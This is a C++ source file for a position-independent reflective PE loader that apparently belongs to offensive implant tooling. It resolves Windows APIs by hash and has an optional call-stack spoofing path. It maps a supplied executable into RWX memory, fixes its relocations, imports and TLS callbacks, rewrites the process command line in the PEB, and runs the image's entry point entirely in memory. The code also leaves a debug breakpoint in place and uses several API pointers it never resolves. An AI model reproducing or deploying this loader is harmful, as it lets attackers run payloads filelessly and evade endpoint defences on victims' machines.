#include <General.hpp>

using namespace mscorlib;

auto DECLFN LibLoad(CHAR* LibName) -> UPTR {
	G_INSTANCE

		if (!Instance->Ctx.IsSpoof) {
			return (UPTR)Instance->Win32.LoadLibraryA(LibName);
		}

	Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);

	return (UPTR)Spoof::Call((UPTR)(Instance->Win32.LoadLibraryA), 0, (UPTR)LibName);
}

auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
	UPTR Ntdll = LoadModule(HashStr("ntdll.dll"));
	UPTR Kernel32 = LoadModule(HashStr("kernel32.dll"));
	UPTR Msvcrt = LoadModule(HashStr("msvcrt.dll"));
	UPTR Shell32 = LoadModule(HashStr("shell32.dll"));

	Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

	if (!Shell32) LibLoad("shell32.dll");

	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
	Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
	Instance->Win32.HeapFree = (decltype(Instance->Win32.HeapFree))LoadApi(Kernel32, HashStr("HeapFree"));
	Instance->Win32.swprintfw = (decltype(Instance->Win32.swprintfw))LoadApi(Msvcrt, HashStr("swprintfW"));

	Instance->Win32.RtlAllocateHeap = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
	Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
	Instance->Win32.RtlFreeHeap = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));

	Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
	Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

	Instance->Win32.GetProcAddress = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
	Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

	Instance->Win32.NtAllocateVirtualMemory = (decltype(Instance->Win32.NtAllocateVirtualMemory))LoadApi(Ntdll, HashStr("NtAllocateVirtualMemory"));
	Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));
	Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

	Instance->Win32.GetConsoleWindow = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
	Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
	Instance->Win32.FreeConsole = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

	Instance->Win32.ReadFile = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
	Instance->Win32.WriteFile = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
	Instance->Win32.SetStdHandle = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
	Instance->Win32.GetStdHandle = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

	Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
	Instance->Win32.NtContinue = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
	Instance->Win32.RtlCaptureContext = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

	Instance->Win32.RtlAddVectoredExceptionHandler = (decltype(Instance->Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
	Instance->Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance->Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

	Instance->Win32.RtlInitializeCriticalSection = (decltype(Instance->Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
	Instance->Win32.RtlEnterCriticalSection = (decltype(Instance->Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
	Instance->Win32.RtlLeaveCriticalSection = (decltype(Instance->Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

	Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
	Instance->Win32.RtlUserThreadStart = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
	Instance->Win32.BaseThreadInitThunk = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));
	Instance->Win32.RtlExitUserThread = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
	Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
}

// Alloc virtual memory for PE
auto DECLFN AllocVm( PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
	G_INSTANCE

	Instance->Win32.DbgPrint("[+] Allocating virtual memory: Size=%llu, AllocType=%lu, Protection=%lu\n", *Size, AllocType, Protection);
	if ( ! Instance->Ctx.IsSpoof ) { 
		return Instance->Win32.NtAllocateVirtualMemory( 
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection  
		);
	} else {
		return Instance->Win32.NtAllocateVirtualMemory(
			NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection
		);
	}
}

// define memory protections
auto DECLFN ProtVm( PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
	G_INSTANCE

	if ( ! Instance->Ctx.IsSpoof ) {
		return Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt );
	} 

	return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
}

auto DECLFN FixTls(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
	if ( DataDir->Size ) {
		PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( (UPTR)( Base ) + DataDir->VirtualAddress );
		PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

		if ( Callback ) {
			for ( INT i = 0; Callback[i] != nullptr; ++i ) {
				Callback[i]( Base, DLL_PROCESS_ATTACH, nullptr );
			}
		}
	}
}

auto DECLFN FixExp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
	G_INSTANCE

	if ( DataDir->Size ) {
		PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( (UPTR)( Base ) + DataDir->VirtualAddress );

		Instance->Win32.RtlAddFunctionTable( (PRUNTIME_FUNCTION)FncEntry, DataDir->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ), (UPTR)( Base ) );
	}
}

auto DECLFN FixImp(
	_In_ PVOID Base,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> BOOL {
	G_INSTANCE

	PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( (UPTR)( Base ) + DataDir->VirtualAddress );

	for ( ; ImpDesc->Name; ImpDesc++ ) {

		PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->FirstThunk );
		PIMAGE_THUNK_DATA OriginThunk = FirstThunk;
		if (ImpDesc->OriginalFirstThunk)
			OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );

		PCHAR  DllName     = (CHAR*)( (UPTR)( Base ) + ImpDesc->Name );
		PVOID  DllBase     = (PVOID)( Instance->Win32.GetModuleHandleA( DllName ) );

		PVOID  FunctionPtr = 0;
		STRING AnsiString  = { 0 };

		if ( !DllBase ) {
			DllBase = (PVOID)LibLoad( DllName );
		}

		if ( !DllBase ) {
			return FALSE;
		}

		for ( ; OriginThunk->u1.Function; FirstThunk++, OriginThunk++ ) {

			if ( IMAGE_SNAP_BY_ORDINAL( OriginThunk->u1.Ordinal ) ) {

				Instance->Win32.LdrGetProcedureAddress( 
					(HMODULE)DllBase, NULL, IMAGE_ORDINAL( OriginThunk->u1.Ordinal ), &FunctionPtr
				);

				FirstThunk->u1.Function = (UPTR)( FunctionPtr );
				if ( !FirstThunk->u1.Function ) return FALSE;

			} else {
				PIMAGE_IMPORT_BY_NAME Hint = (PIMAGE_IMPORT_BY_NAME)( (UPTR)( Base ) + OriginThunk->u1.AddressOfData );

				{
					AnsiString.Length        = Str::LengthA( Hint->Name );
					AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
					AnsiString.Buffer        = Hint->Name;
				}
				
				Instance->Win32.LdrGetProcedureAddress( 
					(HMODULE)DllBase, &AnsiString, 0, &FunctionPtr 
				);
				FirstThunk->u1.Function = (UPTR)( FunctionPtr );

				if ( !FirstThunk->u1.Function ) return FALSE;
			}
		}
	}
	
	return TRUE;
}

// Fix relocations
auto DECLFN FixRel(
	_In_ PVOID Base,
	_In_ UPTR  Delta,
	_In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
	PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( (UPTR)( Base ) + DataDir->VirtualAddress );
	PIMAGE_RELOC           RelocInf  = { 0 };
	ULONG_PTR              RelocPtr  = NULL;

	while ( BaseReloc->VirtualAddress ) {
		
		RelocInf = (PIMAGE_RELOC)( BaseReloc + 1 ); 
		RelocPtr = ( (UPTR)( Base ) + BaseReloc->VirtualAddress );

		while ( (BYTE*)( RelocInf ) != (BYTE*)( BaseReloc ) + BaseReloc->SizeOfBlock ) {
			switch ( RelocInf->Type ) {
			case IMAGE_REL_TYPE:
				*(UINT64*)( RelocPtr + RelocInf->Offset ) += (ULONG_PTR)( Delta ); break;
			case IMAGE_REL_BASED_HIGHLOW:
				*(UINT32*)( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
			case IMAGE_REL_BASED_HIGH:
				*(UINT16*)( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
			case IMAGE_REL_BASED_LOW:
				*(UINT16*)( RelocPtr + RelocInf->Offset ) += LOWORD( Delta ); break;
			default:
				break;
			}

			RelocInf++;
		}

		BaseReloc = (PIMAGE_BASE_RELOCATION)RelocInf;
	};

	return;
}

// Fix command line arguments
auto DECLFN FixArguments(WCHAR* wArguments) -> VOID {
	G_INSTANCE
		INT     ArgC = 0;

	WCHAR* wNewCommand = nullptr;
	PRTL_USER_PROCESS_PARAMETERS	pParam = ((PPEB)__readgsqword(0x60))->ProcessParameters;
	Instance->Win32.RtlSecureZeroMemory(pParam->CommandLine.Buffer, pParam->CommandLine.Length * sizeof(WCHAR));

	if(wArguments) {
		if (!(wNewCommand = reinterpret_cast<WCHAR*>(Instance->Win32.HeapAlloc(Instance->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ((Instance->Win32.wcslen(wArguments) + pParam->ImagePathName.Length) * sizeof(WCHAR) + sizeof(WCHAR)))))) {
			return;
		}
		Instance->Win32.swprintfw(
			wNewCommand,
			L"%s %s",
			pParam->ImagePathName.Buffer,
			wArguments
		);

		Instance->Win32.lstrcpyW(pParam->CommandLine.Buffer, wNewCommand);
		pParam->CommandLine.Length = pParam->CommandLine.MaximumLength = Instance->Win32.wcslen(pParam->CommandLine.Buffer) * sizeof(WCHAR) + sizeof(WCHAR);
		pParam->CommandLine.MaximumLength += sizeof(WCHAR);
		Instance->Win32.HeapFree(Instance->Win32.GetProcessHeap(), 0, wNewCommand);
		return;
	}
	else
	{
		Instance->Win32.lstrcpyW(pParam->CommandLine.Buffer, pParam->ImagePathName.Buffer);
		pParam->CommandLine.Length = pParam->CommandLine.MaximumLength = Instance->Win32.wcslen(pParam->CommandLine.Buffer) * sizeof(WCHAR) + sizeof(WCHAR);
		pParam->CommandLine.MaximumLength += sizeof(WCHAR);
	}
}

auto DECLFN FixMemPermissions(BYTE* PeBaseAddr, IMAGE_NT_HEADERS* Header, IMAGE_SECTION_HEADER* SecHeader) -> VOID {
	G_INSTANCE
	for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
		ULONG OldProt = NULL;
		ULONG NewProt = 0;
		ULONG SecChar = SecHeader[i].Characteristics;
		if ( SecChar & IMAGE_SCN_MEM_EXECUTE ) {
			if ( SecChar & IMAGE_SCN_MEM_WRITE ) {
				NewProt = PAGE_EXECUTE_READWRITE;
			} else if ( SecChar & IMAGE_SCN_MEM_READ ) {
				NewProt = PAGE_EXECUTE_READ;
			} else {
				NewProt = PAGE_EXECUTE;
			}
		} else {
			if ( SecChar & IMAGE_SCN_MEM_WRITE ) {
				NewProt = PAGE_READWRITE;
			} else if ( SecChar & IMAGE_SCN_MEM_READ ) {
				NewProt = PAGE_READONLY;
			} else {
				NewProt = PAGE_NOACCESS;
			}
		}
		BYTE*  SectionBase = PeBaseAddr + SecHeader[i].VirtualAddress;
		SIZE_T SectionSize = SecHeader[i].Misc.VirtualSize;

		ProtVm(
			(PVOID*) &SectionBase,
			&SectionSize,
			NewProt,
			&OldProt
		);
	}
}

auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {

	G_INSTANCE

	HANDLE  BckpStdout = INVALID_HANDLE_VALUE;
	PVOID pEntryPoint = NULL;
	
	BckpStdout = Instance->Win32.GetStdHandle(STD_OUTPUT_HANDLE);

	Instance->Win32.DbgPrint("[+] Reflective PE Loader Invoked...\n");
	Instance->Win32.DbgPrint("[+] Buffer Address: %p\n", Buffer);
	Instance->Win32.DbgPrint("[+] Buffer Size: %d\n", Size);
	
	// Validate PE file
	if ( *(USHORT*)( Buffer ) != 0x5A4D ) {
		Instance->Win32.DbgPrint("[-] Invalid PE file!\n");
		Instance->Win32.DbgPrint("[-] First bytes: %x\n", *(ULONG*)(Buffer));
		return FALSE;
	}
	ULONG oldProt = NULL;
	BYTE* PeBaseAddr = nullptr;

	Instance->Win32.DbgPrint("[+] PE file validated.\n");

	// Parse PE headers
	IMAGE_NT_HEADERS*     Header    = (IMAGE_NT_HEADERS*)( Buffer + ( (IMAGE_DOS_HEADER*)Buffer )->e_lfanew );
	IMAGE_SECTION_HEADER* SecHeader = IMAGE_FIRST_SECTION( Header );
	IMAGE_DATA_DIRECTORY* ExportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	IMAGE_DATA_DIRECTORY* ImportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	IMAGE_DATA_DIRECTORY* TlsDir    = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	IMAGE_DATA_DIRECTORY* RelocDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	Instance->Win32.DbgPrint("[+] Parsed PE headers.\n");

	SIZE_T RegionSize = Size;

	__asm("int3");
	// Allocate memory for PE
	AllocVm((PVOID*)&PeBaseAddr, 0, &RegionSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	Instance->Win32.DbgPrint("[+] Allocated memory for PE at: %p\n", PeBaseAddr);

	Mem::Copy(
		PeBaseAddr,
		Buffer,
		Header->OptionalHeader.SizeOfHeaders
	);
	Instance->Win32.DbgPrint("[+] Copied PE headers to allocated memory.\n");

	// Copy PE headers
	for(int i=0; i < Header->FileHeader.NumberOfSections; i++) {
		Mem::Copy(
			(PVOID)(PeBaseAddr + SecHeader[i].VirtualAddress),
			(PVOID)(Buffer + SecHeader[i].PointerToRawData),
			SecHeader[i].SizeOfRawData
		);
	}

	// Fix relocations
	ULONG_PTR Delta = (ULONG_PTR)(PeBaseAddr)-Header->OptionalHeader.ImageBase;
	FixRel(PeBaseAddr, Delta, RelocDir);

	// Fix IAT
	if (!FixImp(PeBaseAddr, ImportDir)) {
		return FALSE;
	}

	// Fix memory permissions
	FixMemPermissions(PeBaseAddr, Header, SecHeader);

	BOOL isDllFile = (Header->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;

	FixArguments(Arguments);

	// Set Exception handlers
	FixExp(PeBaseAddr, ExceptDir);

	// Call TLS callbacks
	FixTls(PeBaseAddr, TlsDir);

	Instance->Win32.SetStdHandle(STD_OUTPUT_HANDLE, BckpStdout);
	Instance->Win32.SetStdHandle(STD_ERROR_HANDLE, BckpStdout);

	pEntryPoint = (PVOID)(PeBaseAddr + Header->OptionalHeader.AddressOfEntryPoint);
	if (isDllFile)
	{
		typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
		((DLLMAIN)pEntryPoint)((HINSTANCE)PeBaseAddr, DLL_PROCESS_ATTACH, NULL);
	}
	else
	{
		typedef BOOL(WINAPI* MAIN)();
		return ((MAIN)pEntryPoint)();
	}
	
	return TRUE;
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
	PARSER   Psr      = { 0 };
	INSTANCE Instance = { 0 };

	PVOID ArgBuffer = nullptr;

	NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

	Instance.Start      = StartPtr();
	Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
	Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

	Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );

	LoadEssentials(&Instance);

	Instance.Win32.DbgPrint("\n\n[+] Reflection shellcode started...\n");
	
	Parser::New( &Psr, ArgBuffer );

	ULONG  Length    = 0;
	BYTE*  Buffer    = Parser::Bytes( &Psr, &Length );
	CHAR*  Arguments = Parser::Str( &Psr );

	ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);

	WCHAR wArguments[MAX_PATH * 2] = { 0 };
	Str::CharToWChar(wArguments, Arguments, ArgumentsL);
	
	ULONG Result = Reflect(Buffer, Length, wArguments);

	Parser::Destroy(&Psr);

	Instance.Win32.RtlExitUserThread(Result);
}